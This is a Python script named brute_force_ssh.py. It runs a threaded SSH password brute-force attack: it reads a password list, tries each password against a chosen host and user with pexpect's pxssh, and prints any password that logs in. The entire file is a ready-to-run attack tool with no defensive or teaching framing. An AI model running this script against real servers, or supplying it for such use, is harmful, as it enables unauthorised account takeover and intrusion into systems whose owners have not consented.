from pexpect import pxssh
import optparse
import sys
import os
import time
from threading import *

MAXCONNECTIONS = 5
CONNECTION_LOCK = BoundedSemaphore(value=MAXCONNECTIONS)
found = False
fails = 0


def connect(host, user, password, release):
    global found
    global fails
    try:
        s = pxssh.pxssh()
        s.login(host, user, password)
        print("Password Found: " + password)
        found = True
    except Exception as e:
        if "read_nonblocking" in str(e):
            fails += 1
            time.sleep(5)
            connect(host, user, password, False)
        elif "synchronize with original prompt" in str(e):
            fails += 1
            time.sleep(1)
            connect(host, user, password, False)
    finally:
        if release:
            CONNECTION_LOCK.release()


def main():
    parser = optparse.OptionParser('brute_force_ssh.py' +
                                   '-H <targethost> -u <user> -F <password list>')
    parser.add_option('-H', dest='tgtHost', type='string',
                      help='Specify target host')
    parser.add_option('-u', dest='user', type='string',
                      help='Specify user')
    parser.add_option('-F', dest='passwdFile', type='string',
                      help='Specify password file location')
    options, arg = parser.parse_args()

    host = options.tgtHost
    passwdFile = options.passwdFile
    user = options.user

    if host is None or passwdFile is None or user is None:
        print(parser.usage)
        sys.exit(0)

    if not os.path.isfile(passwdFile.strip()):
        print("File does not exist")
        sys.exit(0)

    passwd_list = []
    with open(passwdFile, 'r') as passwords:
        for password in passwords:
            passwd_list.append(password.strip())

    threads = []
    for password in passwd_list:
        if found:
            print("Exiting password found")
            sys.exit(0)
        if fails > 5:
            print("Exiting too many socket timeouts")
            sys.exit(0)
        # this forces it to wait so only 5 threads are active but not merged
        CONNECTION_LOCK.acquire()
        testPassword = password.strip()
        print(f"Testing {testPassword}")
        t = Thread(target=connect, args=(host, user, testPassword, True))
        threads.append(t)
        child = t.start()

    for thread in threads:
        thread.join()


if __name__ == "__main__":
    main()
